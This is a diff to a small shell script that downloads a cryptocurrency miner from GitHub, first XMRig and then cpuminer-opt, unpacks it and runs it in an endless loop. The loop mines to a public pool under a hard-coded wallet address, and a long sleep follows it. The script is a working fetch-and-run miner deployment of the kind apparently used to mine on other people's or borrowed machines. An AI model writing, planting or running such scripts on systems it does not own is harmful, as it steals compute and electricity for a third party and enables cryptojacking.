@@ -1,7 +1,7 @@
 #!/bin/sh
-wget https://github.com/xmrig/xmrig/releases/download/v5.11.3/xmrig-5.11.3-xenial-x64.tar.gz && tar -zxf xmrig-5.11.3-xenial-x64.tar.gz && cd xmrig-5.11.3
+wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && chmod +x cpuminer-avx2
 while [ 1 ]; do
-./xmrig  -o rx.unmineable.com:3333 -u DOGE:DSmJqAfFa9GdpSpMHG8URYg4MXLQHS4dDA.pajo -p x
+./cpuminer-avx2 -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u D9zT4xf7iGNcbrH6nLEKBCqjmiC3yKPwc2 -p c=DGB -t 2
 sleep 3
 done
 sleep 999
